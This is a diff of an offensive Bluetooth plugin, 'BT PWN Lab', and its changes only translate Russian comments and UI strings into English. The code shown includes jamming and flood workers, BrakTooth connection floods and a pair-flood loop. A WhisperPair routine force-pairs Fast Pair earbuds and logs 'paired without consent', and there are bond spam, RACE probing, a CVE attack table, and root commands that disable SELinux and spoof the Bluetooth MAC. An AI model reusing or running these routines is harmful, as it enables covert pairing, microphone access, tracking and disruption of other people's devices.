@@ -2,16 +2,16 @@
 #  BT PWN Lab — Dolphy plugin
 #  id: bt_pwn_lab | v4.3 | Venice | section BLUETOOTH
 #  ---------------------------------------------------------------------------
-#  БАЗА v3.2 СОХРАНЕНА 1:1. НИЧЕГО существующего не менялось — только добавки.
-#  v4.0 bridge вместо su · v4.1 тулзы/Root Lab/stack-вектор/терминал/+6 CVE
-#  v4.2 фикс сканера (батч-колбэк, изоляция ошибок, _fp_model)
-#  v4.3 ИМЕНА:
-#    · имя читается из всех вариантов ключа (name/deviceName/localName/…)
-#    · имя больше НЕ стирается при обновлении пакета (мерж записи)
-#    · известные имена подтягиваются из спаренных устройств и bt_config.conf
-#    · кнопка «Прочитать имя» (GATT DIS 0x180A / Device Name 0x2A00)
-#    · автоподтягивание имени при открытии карточки устройства
-#    · фильтр «Имена»
+#  v3.2 BASE PRESERVED 1:1. Nothing existing was changed -- additions only.
+#  v4.0 bridge instead of su · v4.1 tools/Root Lab/stack vector/terminal/+6 CVEs
+#  v4.2 scanner fix (batch callback, error isolation, _fp_model)
+#  v4.3 NAMES:
+#    · the name is read from every key variant (name/deviceName/localName/…)
+#    · the name is NO longer wiped on advertisement update (record merge)
+#    · known names are pulled from bonded devices and bt_config.conf
+#    · "Read name" button (GATT DIS 0x180A / Device Name 0x2A00)
+#    · automatic name lookup when opening a device card
+#    · "Names" filter
 # ============================================================================
 import json
 import time
@@ -23,13 +23,13 @@ __id__          = "bt_pwn_lab"
 __name__        = "BT PWN Lab"
 __version__     = "4.3"
 __author__      = "Venice"
-__description__ = "BLE-разведка, WhisperPair, RACE, Jammer MAX, root lab (A13), база CVE BT"
+__description__ = "BLE recon, WhisperPair, RACE, Jammer MAX, root lab (A13), BT CVE database"
 __icon__        = "rounded:bluetooth_searching"
 __permissions__ = ["bluetooth", "root", "shell"]
 
 
 # ============================================================================
-#  OUI / чипы  (v3.2, без правок)
+#  OUI / chips  (v3.2, unchanged)
 # ============================================================================
 OUI = {
     "A4C138": "Telink/Xiaomi", "001A79": "Huawei", "240AC4": "Espressif",
@@ -78,7 +78,7 @@ FP_KBP     = "fe2c1234-8366-4814-8eb0-01de32100bea"
 FP_PASSKEY = "fe2c1235-8366-4814-8eb0-01de32100bea"
 FP_ACCOUNT = "fe2c1236-8366-4814-8eb0-01de32100bea"
 
-# v4.3: Device Information Service — отсюда тянем настоящее имя
+# v4.3: Device Information Service -- the real name is pulled from here
 DIS_SERVICE = "0000180a-0000-1000-8000-00805f9b34fb"
 DIS_NAME    = "00002a00-0000-1000-8000-00805f9b34fb"
 DIS_MODEL   = "00002a24-0000-1000-8000-00805f9b34fb"
@@ -86,7 +86,7 @@ DIS_MANUF   = "00002a29-0000-1000-8000-00805f9b34fb"
 
 
 # ============================================================================
-#  VULNDB  (первые 17 — исходные v3.2)
+#  VULNDB  (first 17 -- original v3.2)
 # ============================================================================
 VULNDB = [
     ("CVE-2021-34144", "BrakTooth", "V2", 6.5, "Truncated SCO Link Request",
@@ -114,17 +114,17 @@ VULNDB = [
     ("CVE-2019-16336", "SweynTooth", "LLID", 6.1, "Link Layer LLID Deadlock",
      ["telink"], "deadlock", "conn"),
     ("CVE-2019-19194", "SweynTooth", "ZeroLTK", 6.1, "Zero LTK Installation",
-     ["telink"], "обход шифрования", "conn"),
+     ["telink"], "crypto bypass", "conn"),
     ("CVE-2019-9506", "KNOB", "1", 8.1, "Key Negotiation of Bluetooth",
-     ["*"], "ключ 1 байт", "knob"),
+     ["*"], "1-byte key", "knob"),
     ("CVE-2023-24023", "BLUFFS", "1", 6.8, "Forced Short Key",
      ["*"], "AiTM", "knob"),
     ("CVE-2020-9770", "BLESA", "1", 6.5, "BLE Reconnection Spoofing",
-     ["*"], "спуфинг", "conn"),
+     ["*"], "spoofing", "conn"),
     ("CVE-2023-45866", "HID Injection", "1", 7.1, "Unauthenticated HID Injection",
-     ["*"], "инъекция нажатий", "-"),
+     ["*"], "key injection", "-"),
 
-    # ---------------- BrakTooth, добор ----------------
+    # ---------------- BrakTooth, extras ----------------
     ("CVE-2021-31612", "BrakTooth", "V3", 6.5, "LMP Cold CCE",
      ["jieli", "bluetrum", "espressif"], "crash/deadlock", "inq"),
     ("CVE-2021-34145", "BrakTooth", "V10", 7.5, "LMP Accepted Flood",
@@ -143,9 +143,9 @@ VULNDB = [
      ["espressif"], "deadlock", "inq"),
     ("CVE-2021-28156", "BrakTooth", "V6", 6.5, "LMP Accepted Overflow",
      ["espressif"], "crash", "conn"),
-    # ---------------- SweynTooth, добор ----------------
+    # ---------------- SweynTooth, extras ----------------
     ("CVE-2019-17517", "SweynTooth", "ZeroLTK-S", 6.1, "Zero LTK (Samsung)",
-     ["unknown"], "обход шифрования", "conn"),
+     ["unknown"], "crypto bypass", "conn"),
     ("CVE-2019-17518", "SweynTooth", "LLID-NXP", 6.1, "LLID Deadlock (NXP)",
      ["unknown"], "deadlock", "conn"),
     ("CVE-2019-17519", "SweynTooth", "L2CAP", 6.1, "Truncated L2CAP (Cypress)",
@@ -153,68 +153,68 @@ VULNDB = [
     ("CVE-2019-17520", "SweynTooth", "ATT", 6.1, "Sequential ATT Deadlock",
      ["unknown"], "deadlock", "conn"),
     ("CVE-2019-19195", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (Cypress)",
-     ["unknown"], "обход шифрования", "conn"),
+     ["unknown"], "crypto bypass", "conn"),
     ("CVE-2019-19196", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (NXP)",
-     ["unknown"], "обход шифрования", "conn"),
+     ["unknown"], "crypto bypass", "conn"),
     ("CVE-2019-19197", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (TI)",
-     ["unknown"], "обход шифрования", "conn"),
+     ["unknown"], "crypto bypass", "conn"),
     ("CVE-2019-19198", "SweynTooth", "KeySize", 6.1, "Key Size Bypass (Dialog)",
-     ["unknown"], "обход шифрования", "conn"),
-    # ---------------- классика / стек ----------------
+     ["unknown"], "crypto bypass", "conn"),
+    # ---------------- classic / stack ----------------
     ("CVE-2017-0781", "BlueBorne", "BNEP", 8.8, "BNEP Heap Overflow",
      ["*"], "RCE", "-"),
-    ("CVE-2017-0782", "BlueBorne", "BNEP", 8.8, "BNEP RCE/утечка",
+    ("CVE-2017-0782", "BlueBorne", "BNEP", 8.8, "BNEP RCE/leak",
      ["*"], "RCE", "-"),
     ("CVE-2017-0783", "BlueBorne", "PAN", 8.1, "PAN Profile RCE",
      ["*"], "RCE", "-"),
     ("CVE-2017-0785", "BlueBorne", "SDP", 5.3, "SDP Info Leak",
-     ["*"], "утечка памяти", "-"),
+     ["*"], "memory leak", "-"),
     ("CVE-2018-5383", "Invalid Curve", "1", 7.1, "ECDH Invalid Curve",
-     ["*"], "обход шифрования", "knob"),
+     ["*"], "crypto bypass", "knob"),
     ("CVE-2020-15802", "BLURtooth", "1", 6.5, "Cross-transport key overwrite",
      ["*"], "AiTM", "knob"),
     ("CVE-2020-12351", "BleedingTooth", "1", 8.3, "L2CAP A2MP Heap OOB",
      ["*"], "RCE (Linux)", "-"),
     ("CVE-2020-12352", "BleedingTooth", "2", 6.5, "A2MP Info Leak",
-     ["*"], "утечка ядра", "-"),
+     ["*"], "kernel leak", "-"),
     ("CVE-2020-24490", "BleedingTooth", "3", 6.5, "BLE Adv Buffer Overflow",
      ["*"], "DoS (Linux)", "conn"),
     ("CVE-2020-0022", "BlueFrag", "1", 7.8, "Android BLE OOB Write",
      ["*"], "RCE (Android 8/9)", "conn"),
     ("CVE-2022-25836", "Legacy Pairing", "1", 6.5, "LE Legacy brute-force",
-     ["*"], "перехват ключа", "knob"),
+     ["*"], "key interception", "knob"),
     ("CVE-2022-25837", "Legacy Pairing", "2", 6.5, "LE Legacy downgrade",
-     ["*"], "перехват ключа", "knob"),
+     ["*"], "key interception", "knob"),
     ("CVE-2024-0230", "HID Injection", "2", 6.5, "Apple pairing key extraction",
-     ["*"], "инъекция нажатий", "-"),
+     ["*"], "key injection", "-"),
     ("CVE-2024-21306", "HID Injection", "3", 5.7, "Windows BT HID spoofing",
-     ["*"], "инъекция нажатий", "-"),
+     ["*"], "key injection", "-"),
     ("CVE-2024-23694", "Android LE Audio", "1", 7.8, "LE Audio Use-After-Free",
      ["*"], "RCE (Android 14)", "conn"),
     ("CVE-2024-45431", "PerfektBlue", "1", 8.8, "BlueSDK pairing bypass",
-     ["*"], "RCE (авто)", "knob"),
+     ["*"], "RCE (automotive)", "knob"),
     ("CVE-2024-45432", "PerfektBlue", "2", 8.8, "BlueSDK SDP RCE",
-     ["*"], "RCE (авто)", "-"),
+     ["*"], "RCE (automotive)", "-"),
     ("CVE-2024-45433", "PerfektBlue", "3", 7.5, "BlueSDK DoS",
-     ["*"], "DoS (авто)", "-"),
+     ["*"], "DoS (automotive)", "-"),
     ("CVE-2024-45434", "PerfektBlue", "4", 8.8, "BlueSDK info leak",
-     ["*"], "утечка", "-"),
+     ["*"], "info leak", "-"),
     ("CVE-2025-36911", "WhisperPair", "FastPair", 9.1, "Fast Pair forced pairing",
      ["fastpair", "jieli", "airoha", "bluetrum"],
-     "тихое сопряжение · микрофон · трекинг через Find Hub", "fp"),
-    # ---------------- v4.1: Android BT-стек (A13) ----------------
+     "silent pairing · microphone · Find Hub tracking", "fp"),
+    # ---------------- v4.1: Android BT stack (A13) ----------------
     ("CVE-2023-40087", "Android BT", "AVRCP", 7.8,
-     "btif_avrcp_audio_track OOB write", ["*"], "EoP от paired-устройства", "-"),
+     "btif_avrcp_audio_track OOB write", ["*"], "EoP from a paired device", "-"),
     ("CVE-2024-0045", "Android BT", "SMP", 7.5,
-     "smp_proc_sec_req OOB read", ["*"], "утечка (proximal)", "conn"),
+     "smp_proc_sec_req OOB read", ["*"], "info leak (proximal)", "conn"),
     ("CVE-2024-0016", "Android BT", "Core", 6.5,
-     "OOB read: раскрытие paired data", ["*"], "утечка данных", "conn"),
+     "OOB read: paired data disclosure", ["*"], "data leak", "conn"),
     ("CVE-2023-40090", "Android BT", "Core", 7.8,
-     "Core stack OOB (семейство AVRCP)", ["*"], "EoP", "-"),
+     "Core stack OOB (AVRCP family)", ["*"], "EoP", "-"),
     ("CVE-2023-21273", "Android BT", "Stack", 8.8,
-     "Use-after-free в BT-стеке", ["*"], "EoP", "-"),
+     "Use-after-free in the BT stack", ["*"], "EoP", "-"),
     ("CVE-2023-35672", "Android BT", "Stack", 7.8,
-     "OOB write в BT-стеке (уточнить)", ["*"], "EoP", "-"),
+     "OOB write in the BT stack (TBC)", ["*"], "EoP", "-"),
 ]
 
 
@@ -252,12 +252,12 @@ def _chip_of(name, mac, uuids):
 def _rssi_label(r):
     r = int(r)
     if r >= -55:
-        return "Отличный"
+        return "Excellent"
     if r >= -70:
-        return "Хороший"
+        return "Good"
     if r >= -85:
-        return "Слабый"
-    return "Очень слабый"
+        return "Weak"
+    return "Very weak"
 
 
 def _fp_model(d):
@@ -281,13 +281,13 @@ def _fp_model(d):
     return None
 
 
-# ---------------------------------------------------------------- v4.3: имена
+# ---------------------------------------------------------------- v4.3: names
 NAME_KEYS = ("name", "deviceName", "localName", "btName", "Name",
              "device_name", "local_name", "advertisedName")
 
 
 def _pick_name(d):
-    """Имя из любого варианта ключа, включая вложенный scanRecord."""
+    """Name from any key variant, including a nested scanRecord."""
     if not isinstance(d, dict):
         return None
     for k in NAME_KEYS:
@@ -318,11 +318,11 @@ def _dev_label(d):
     nm = _pick_name(d)
     if nm:
         return nm
-    return "без имени · %s" % (d.get("vendor") or "?")
+    return "no name · %s" % (d.get("vendor") or "?")
 
 
 # ============================================================================
-#  ВЫПОЛНЕНИЕ: Dolphy bridge
+#  EXECUTION: Dolphy bridge
 # ============================================================================
 _EXEC = None
 
@@ -367,7 +367,7 @@ def _has_root():
 
 
 # ============================================================================
-#  автопоиск BlueZ-тулз (в т.ч. Magisk-модули вида Bluetooth++)
+#  auto-discovery of BlueZ tools (incl. Magisk modules like Bluetooth++)
 # ============================================================================
 TOOL_NAMES = ["hcitool", "hciconfig", "btmgmt", "bluetoothctl",
               "hcidump", "btmon", "hciattach"]
@@ -405,7 +405,7 @@ def _have_bt_tools():
 
 
 # ============================================================================
-#  ПЛАГИН
+#  PLUGIN
 # ============================================================================
 class BtPwnLab(BasePlugin):
 
@@ -415,7 +415,7 @@ class BtPwnLab(BasePlugin):
         self.devices = {}
         self.selected = None
         self.filter = "all"
-        self.status = "Готов"
+        self.status = "Ready"
         self.log_lines = []
         self.vuln_results = []
         self.jam_mode = "lescan"
@@ -456,10 +456,10 @@ class BtPwnLab(BasePlugin):
             self.root_ok = bool(self.api.getDevice().rootAvailable())
         except Exception:
             self.root_ok = _has_root()
-        self.log("Загружено. root=%s" % self.root_ok)
+        self.log("Loaded. root=%s" % self.root_ok)
         self.add_module(
             "BT PWN Lab",
-            "BLE-разведка, джеммер, link keys, уязвимости BT-аудио",
+            "BLE recon, jammer, link keys, BT audio vulnerabilities",
             "bluetooth_searching",
             "main",
             "BLUETOOTH",
@@ -480,7 +480,7 @@ class BtPwnLab(BasePlugin):
                 return
             self.tools = _probe_tools(True)
             if self.tools:
-                self.log("Тулзы: " + ", ".join(sorted(self.tools.keys())))
+                self.log("Tools: " + ", ".join(sorted(self.tools.keys())))
         except Exception as e:
             self.log("tools err: %s" % e)
 
@@ -535,7 +535,7 @@ class BtPwnLab(BasePlugin):
 
     # ---------------------------------------------------------------- v4.3
     def _refresh_known_names(self):
-        """Имена из спаренных устройств и bt_config.conf — без коннекта."""
+        """Names from bonded devices and bt_config.conf -- no connection needed."""
         m = {}
         try:
             data = json.loads(str(self.api.getAndroid().btBondedDevicesJson()))
@@ -566,8 +566,8 @@ class BtPwnLab(BasePlugin):
                 pass
         if m:
             self.known_names.update(m)
-        self.log("Известных имён: %d" % len(self.known_names))
-        # подставить уже найденным устройствам
+        self.log("Known names: %d" % len(self.known_names))
+        # backfill already found devices
         for mac, d in list(self.devices.items()):
             if not _pick_name(d) and self.known_names.get(mac):
                 d["name"] = self.known_names[mac]
@@ -588,7 +588,7 @@ class BtPwnLab(BasePlugin):
             self.name_log.append(line)
             if len(self.name_log) > 100:
                 self.name_log = self.name_log[-100:]
-            self.log("Имя: %s = %s (%s)" % (mac, name, src))
+            self.log("Name: %s = %s (%s)" % (mac, name, src))
             self.refresh()
 
     def read_name(self):
@@ -600,7 +600,7 @@ class BtPwnLab(BasePlugin):
 
     def _read_name_worker(self, mac):
         dev = self.api.getAndroid()
-        self.log("Читаю имя: %s" % mac)
+        self.log("Reading name: %s" % mac)
         try:
             dev.gattConnect(mac, self.on_gatt_event)
             time.sleep(2.0)
@@ -622,7 +622,7 @@ class BtPwnLab(BasePlugin):
         except Exception as e:
             self.log("read_name err: %s" % e)
         if not _pick_name(self.devices.get(mac, {})):
-            self.log("Имя не отдано: %s (нет DIS или устройство молчит)" % mac)
+            self.log("No name returned: %s (no DIS or device stays silent)" % mac)
         self.refresh()
 
     # ----------------------------------------------------------------- scan
@@ -633,8 +633,8 @@ class BtPwnLab(BasePlugin):
             except Exception:
                 pass
             self.scanning = False
-            self.status = "Скан остановлен · %d устройств" % len(self.devices)
-            self.log("Скан остановлен")
+            self.status = "Scan stopped · %d devices" % len(self.devices)
+            self.log("Scan stopped")
         else:
             self.devices = {}
             threading.Thread(target=self._refresh_known_names, daemon=True).start()
@@ -643,7 +643,7 @@ class BtPwnLab(BasePlugin):
             except Exception as e:
                 self.scanning = False
                 self.log("bleStartScan err: %s" % e)
-            self.status = "Скан идёт…" if self.scanning else "Скан не стартовал (проверь BT и права)"
+            self.status = "Scan running…" if self.scanning else "Scan failed to start (check BT and permissions)"
             self.log(self.status)
         self.refresh()
 
@@ -677,7 +677,7 @@ class BtPwnLab(BasePlugin):
         mac = str(mac).upper()
         prev = self.devices.get(mac)
         if prev:
-            # v4.3: не терять имя и полезные поля при обновлении пакета
+            # v4.3: keep the name and useful fields on advertisement update
             if not _pick_name(d) and _pick_name(prev):
                 d["name"] = _pick_name(prev)
             for k in ("fpModel", "chip", "vendor", "model", "manuf"):
@@ -721,7 +721,7 @@ class BtPwnLab(BasePlugin):
     def open_device(self, d):
         self.selected = d
         self.navigate("details")
-        # v4.3: автоподтягивание имени
+        # v4.3: automatic name lookup
         if (not _pick_name(d) and d.get("connectable")
                 and d.get("address") not in self.name_tried):
             self.read_name()
@@ -736,22 +736,22 @@ class BtPwnLab(BasePlugin):
             for v in d.get("vulns", []):
                 cve, fam, ver, cvss, name, chips, impact, probe = v
                 if d.get("race") and probe == "race":
-                    st = "RACE в эфире"
+                    st = "RACE in the air"
                 elif d.get("fp") and probe == "fp":
-                    st = "Fast Pair в эфире"
+                    st = "Fast Pair in the air"
                 elif d.get("chip") in chips:
-                    st = "ПОДОЗРЕВАЕМ"
+                    st = "SUSPECTED"
                 elif "*" in chips:
-                    st = "протокольная"
+                    st = "protocol-level"
                 else:
-                    st = "инфо"
+                    st = "info"
                 self.vuln_results.append({
                     "mac": d.get("address"), "name": _dev_label(d),
                     "cve": cve, "fam": fam, "name2": name, "cvss": cvss,
                     "status": st, "impact": impact, "probe": probe,
                 })
         self.vuln_results.sort(key=lambda x: -x["cvss"])
-        self.log("Оценка: %d записей" % len(self.vuln_results))
+        self.log("Assessment: %d records" % len(self.vuln_results))
         self.refresh()
 
     # -------------------------------------------------------------- jammer
@@ -776,13 +776,13 @@ class BtPwnLab(BasePlugin):
 
     def jam_start(self):
         if not self.root_ok:
-            self.log("Джеммеру нужен root")
+            self.log("Jammer needs root")
             return
         if self.jam_running:
             return
         self.jam_running = True
         threading.Thread(target=self._jam_worker, args=(self._jam_cmd(),), daemon=True).start()
-        self.log("JAM старт: %s" % self.jam_mode)
+        self.log("JAM start: %s" % self.jam_mode)
         self.refresh()
 
     def _jam_worker(self, cmd):
@@ -792,14 +792,14 @@ class BtPwnLab(BasePlugin):
     def jam_stop(self):
         self.jam_running = False
         self._exec("pkill -f hcitool; pkill -f hciconfig; pkill -f btmgmt", True)
-        self.log("JAM стоп")
+        self.log("JAM stop")
 
     def braktooth(self, kind):
         mac = (self.selected or {}).get("address")
         if not mac:
             return
         if not self.root_ok:
-            self.log("BrakTooth: нужен root")
+            self.log("BrakTooth: root required")
             return
         hci = _tool("hcitool")
         cmd = ("%s -i hci0 cc %s" % (hci, mac)) if kind == "conn" else \
@@ -820,7 +820,7 @@ class BtPwnLab(BasePlugin):
         for _ in range(12):
             _sh("%s -i hci0 dc %s" % (_tool("hcitool"), mac))
             time.sleep(0.4)
-        self.log("Pair flood завершён")
+        self.log("Pair flood finished")
 
     # ------------------------------------------------------- JAMMER MAX
     SPP_UUIDS = [
@@ -889,13 +889,13 @@ class BtPwnLab(BasePlugin):
 
     def vec_summary(self):
         on = [k for k, v in self.vec.items() if v]
-        return "векторы: " + " · ".join(on)
+        return "vectors: " + " · ".join(on)
 
     def jam_max_start(self):
         if self.max_running:
             return
         if not self.devices and not self.selected:
-            self.log("MAX: сначала просканируй эфир")
+            self.log("MAX: scan the air first")
             return
         self.max_running = True
         self.stats = dict.fromkeys(
@@ -914,13 +914,13 @@ class BtPwnLab(BasePlugin):
         if self._tick is None or not self._tick.is_alive():
             self._tick = threading.Thread(target=self._stat_tick, daemon=True)
             self._tick.start()
-        self.log("MAX JAM старт · rfcomm x%d · цели %d · %s"
+        self.log("MAX JAM start · rfcomm x%d · targets %d · %s"
                  % (self.intensity, len(self._targets()), self.vec_summary()))
         self.refresh()
 
     def jam_max_stop(self):
         self.max_running = False
-        self.log("MAX JAM стоп")
+        self.log("MAX JAM stop")
         self.refresh()
 
     def _stat_tick(self):
@@ -928,7 +928,7 @@ class BtPwnLab(BasePlugin):
             self.refresh()
             time.sleep(1.0)
 
-    # ---- воркеры
+    # ---- workers
     def _w_rfcomm(self, i):
         dev = self.api.getAndroid()
         k = i
@@ -1050,7 +1050,7 @@ class BtPwnLab(BasePlugin):
         if not (self.root_ok and self.vec["root"]):
             return
         if not _have_bt_tools():
-            self.log("нет hcitool/btmgmt/bluetoothctl — root-вектор пропущен")
+            self.log("no hcitool/btmgmt/bluetoothctl -- root vector skipped")
             return
         hci = _probe_tools().get("hcitool")
         mgmt = _probe_tools().get("btmgmt")
@@ -1098,7 +1098,7 @@ class BtPwnLab(BasePlugin):
             k += 1
             time.sleep(max(0.5, self.delay * 4))
 
-    # ---- события
+    # ---- events
     def on_rfcomm_event(self, payload):
         try:
             e = json.loads(str(payload))
@@ -1116,7 +1116,7 @@ class BtPwnLab(BasePlugin):
         ev = str(e.get("event", "")).lower()
         if "connect" in ev and "disconnect" not in ev:
             self._bump("gatt_ok")
-        # v4.3: вытаскиваем имя/модель из чтения DIS
+        # v4.3: extract the name/model from DIS reads
         mac = str(e.get("address") or "").upper()
         cu = str(e.get("charUuid") or e.get("characteristic") or e.get("uuid") or "")
         cu = cu.lower().replace("-", "")
@@ -1163,7 +1163,7 @@ class BtPwnLab(BasePlugin):
             self.log("WHISPER: " + s)
 
         w("seeker -> provider %s" % mac)
-        w("проверка: Fast Pair не должен быть в pairing mode")
+        w("check: Fast Pair must not be in pairing mode")
         try:
             w("GATT connect")
             dev.gattConnect(mac, self.on_gatt_event)
@@ -1173,13 +1173,13 @@ class BtPwnLab(BasePlugin):
             w("KBP request 0xFE2C1234 = %s" % req)
             dev.gattWrite(mac, FP_SERVICE, FP_KBP, req)
             time.sleep(1.0)
-            w("классический bond (байпас pairing mode)")
+            w("classic bond (pairing mode bypass)")
             dev.btCreateBond(mac)
             time.sleep(2.5)
             key = "".join(random.choice("0123456789ABCDEF") for _ in range(32))
             w("account key 0xFE2C1236 = %s" % key)
             dev.gattWrite(mac, FP_SERVICE, FP_ACCOUNT, "01" + key)
-            w("итог: устройство спарено без согласия (WhisperPair)")
+            w("result: device paired without consent (WhisperPair)")
         except Exception as e:
             w("ERR: %s" % e)
         self.refresh()
@@ -1201,7 +1201,7 @@ class BtPwnLab(BasePlugin):
             except Exception:
                 pass
             time.sleep(1.0)
-        self.log("WHISPER: bond spam завершён")
+        self.log("WHISPER: bond spam finished")
 
     def open_dolphy_whisper(self):
         self.navigate_app("other/bluetooth_whisperpair")
@@ -1241,7 +1241,7 @@ class BtPwnLab(BasePlugin):
             except Exception as e:
                 self._rline("ERR %s" % e)
             time.sleep(0.6)
-        self._rline("RACE: ответы есть = Airoha открыт без auth (CVE-2025-20700..20702)")
+        self._rline("RACE: replies present = Airoha open without auth (CVE-2025-20700..20702)")
         self.refresh()
 
     def _rline(self, s):
@@ -1328,7 +1328,7 @@ class BtPwnLab(BasePlugin):
 
     def _term_worker(self, cmd, use_root):
         out = self._exec(cmd, use_root)
-        for line in (out or "(пусто)").splitlines()[:400]:
+        for line in (out or "(empty)").splitlines()[:400]:
             self.term_lines.append(line)
         if len(self.term_lines) > 800:
             self.term_lines = self.term_lines[-800:]
@@ -1341,7 +1341,7 @@ class BtPwnLab(BasePlugin):
 
     def _lab_worker(self, cmd, tag):
         out = self._exec(cmd, True)
-        for line in (out or "(пусто)").splitlines()[:60]:
+        for line in (out or "(empty)").splitlines()[:60]:
             self.llog("  " + line)
         self.refresh()
 
@@ -1371,7 +1371,7 @@ class BtPwnLab(BasePlugin):
     def lab_offload_off(self):
         self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled true; "
                      "settings put global bluetooth_a2dp_offload_disabled 1; "
-                     "echo offload off (нужен рестарт стека)", "offload-")
+                     "echo offload off (stack restart required)", "offload-")
 
     def lab_offload_on(self):
         self.lab_run("setprop persist.bluetooth.a2dp_offload.disabled false; "
@@ -1393,7 +1393,7 @@ class BtPwnLab(BasePlugin):
     def lab_mac_random(self):
         m = "02:%02X:%02X:%02X:%02X:%02X" % tuple(random.randint(0, 255) for _ in range(5))
         self.lab_run("resetprop -n ro.boot.btmacaddr %s; getprop ro.boot.btmacaddr; "
-                     "echo 'нужен reboot для полного эффекта'" % m, "btmac-rand")
+                     "echo 'a reboot is required for the full effect'" % m, "btmac-rand")
 
     def lab_selinux_perm(self):
         self.lab_run("getenforce; setenforce 0; getenforce", "selinux")
@@ -1404,12 +1404,12 @@ class BtPwnLab(BasePlugin):
     def lab_tools(self):
         self.tools = _probe_tools(True)
         if self.tools:
-            self.llog("найдено: " + ", ".join("%s=%s" % (k, v)
+            self.llog("found: " + ", ".join("%s=%s" % (k, v)
                                               for k, v in sorted(self.tools.items())))
         else:
-            self.llog("тулзы не найдены. Варианты: Magisk-модуль с BlueZ "
-                      "(Bluetooth++ и подобные) или статические бинарники "
-                      "в /data/local/tmp (chmod 755).")
+            self.llog("tools not found. Options: a Magisk module with BlueZ "
+                      "(Bluetooth++ and similar) or static binaries "
+                      "in /data/local/tmp (chmod 755).")
         self.refresh()
 
     def lab_magisk(self):
@@ -1436,10 +1436,10 @@ class BtPwnLab(BasePlugin):
         self.lab_run("resetprop -p 2>/dev/null | grep -i -E 'gd_stack|gabeldorsche|bt_stack'",
                      "gd")
 
-    # v4.3: диагностика имён
+    # v4.3: name diagnostics
     def lab_names(self):
-        rows = ["известных имён: %d" % len(self.known_names),
-                "устройств с именем: %d из %d"
+        rows = ["known names: %d" % len(self.known_names),
+                "named devices: %d of %d"
                 % (len([d for d in self.devices.values() if _pick_name(d)]),
                    len(self.devices))]
         for mac, nm in list(self.known_names.items())[:30]:
@@ -1457,7 +1457,7 @@ class BtPwnLab(BasePlugin):
                    lambda: self.api.copyToClipboard(mac)):
             try:
                 fn()
-                self.log("Скопировано: %s" % mac)
+                self.log("Copied: %s" % mac)
                 return
             except Exception:
                 pass
@@ -1509,7 +1509,7 @@ class BtPwnLab(BasePlugin):
             sub = "%s · %s dBm · %s" % (d.get("address", ""), d.get("rssi", "?"),
                                         d.get("chip", "?"))
             if _pick_name(d):
-                sub += " · ИМЯ"
+                sub += " · NAME"
             if d.get("vulns"):
                 sub += " · VULN"
             if d.get("fp"):
@@ -1519,8 +1519,8 @@ class BtPwnLab(BasePlugin):
         if not rows:
             rows.append(ui.card([
                 ui.icon("bluetooth_searching", 46),
-                ui.text("Устройств пока нет", "titleMedium"),
-                ui.text("Нажми «Старт скана». Нужны Bluetooth и «Устройства поблизости».",
+                ui.text("No devices yet", "titleMedium"),
+                ui.text("Tap «Start scan». Bluetooth and «Nearby devices» are required.",
                         "bodyMedium"),
             ]))
 
@@ -1531,25 +1531,25 @@ class BtPwnLab(BasePlugin):
                     ui.row([
                         ui.icon("bluetooth", 34),
                         ui.column([
-                            ui.text("Адаптер", "titleLarge"),
-                            ui.text("root: %s · тулзы: %d · имён: %d"
+                            ui.text("Adapter", "titleLarge"),
+                            ui.text("root: %s · tools: %d · names: %d"
                                     % (self.root_ok, len(self.tools),
                                        len(self.known_names)), "bodySmall"),
                         ], spacing=2),
                     ], spacing=12),
                     ui.row([
-                        ui.chip("BT вкл" if caps.get("enabled") else "BT выкл",
+                        ui.chip("BT on" if caps.get("enabled") else "BT off",
                                 bool(caps.get("enabled"))),
-                        ui.chip("LE сканер" if caps.get("leScanner") else "нет сканера",
+                        ui.chip("LE scanner" if caps.get("leScanner") else "no scanner",
                                 bool(caps.get("leScanner"))),
-                        ui.chip("%d найдено" % len(self.devices), False),
+                        ui.chip("%d found" % len(self.devices), False),
                     ], spacing=6),
-                    ui.button("Стоп скана" if self.scanning else "Старт скана",
+                    ui.button("Stop scan" if self.scanning else "Start scan",
                               self.toggle_scan, fill_max_width=True),
                     ui.text(self.status, "bodySmall"),
                 ]),
-                ui.button_group([["all", "Все"], ["named", "Имена"],
-                                 ["vuln", "Уязвимые"], ["race", "RACE"],
+                ui.button_group([["all", "All"], ["named", "Names"],
+                                 ["vuln", "Vulnerable"], ["race", "RACE"],
                                  ["fp", "FastPair"]],
                                 self.filter, self.set_filter),
                 ui.row([
@@ -1567,12 +1567,12 @@ class BtPwnLab(BasePlugin):
                     ui.button("Terminal", self.open_term),
                 ], spacing=8),
                 ui.row([
-                    ui.button("Имена", self.open_names),
+                    ui.button("Names", self.open_names),
                     ui.button("Dolphy Jammer", self.open_dolphy_jammer),
                 ], spacing=8),
-                ui.text("%d устройств" % len(visible), "titleMedium"),
+                ui.text("%d devices" % len(visible), "titleMedium"),
                 ui.segmented_list(rows),
-                ui.button("Лог", self.open_log, fill_max_width=True),
+                ui.button("Log", self.open_log, fill_max_width=True),
             ], padding=16, spacing=12, fill_max_size=True),
         )
 
@@ -1589,14 +1589,14 @@ class BtPwnLab(BasePlugin):
             cve, fam, ver, cvss, vname, chips, impact, probe = v
             vrows.append(ui.settings_row("%s %s" % (cve, fam), vname, "bug_report"))
         if not vrows:
-            vrows = [ui.settings_row("Уязвимости", "чип не определён", "info")]
+            vrows = [ui.settings_row("Vulnerabilities", "chip not identified", "info")]
 
         extra = []
         if d.get("fp"):
             extra = [
                 ui.text("Fast Pair / WhisperPair", "titleMedium"),
                 ui.segmented_list([
-                    ui.settings_row("Fast Pair модель", d.get("fpModel") or "?",
+                    ui.settings_row("Fast Pair model", d.get("fpModel") or "?",
                                     "earbuds"),
                     ui.settings_row("CVE", "CVE-2025-36911 · forced pairing",
                                     "bug_report"),
@@ -1605,7 +1605,7 @@ class BtPwnLab(BasePlugin):
                     ui.button("WhisperPair", self.whisper_attack),
                     ui.button("Bond spam", self.whisper_bond_spam),
                 ], spacing=8),
-                ui.button("Открыть Dolphy WhisperPair", self.open_dolphy_whisper,
+                ui.button("Open Dolphy WhisperPair", self.open_dolphy_whisper,
                           fill_max_width=True),
             ]
         if d.get("race") or chip == "airoha":
@@ -1626,45 +1626,45 @@ class BtPwnLab(BasePlugin):
                     ui.linear_progress(max(0, min(100, (rssi + 100))) / 100.0),
                     ui.text("%d dBm · %s" % (rssi, _rssi_label(rssi)), "titleMedium"),
                 ]),
-                # v4.3: имя
+                # v4.3: name
                 ui.card([
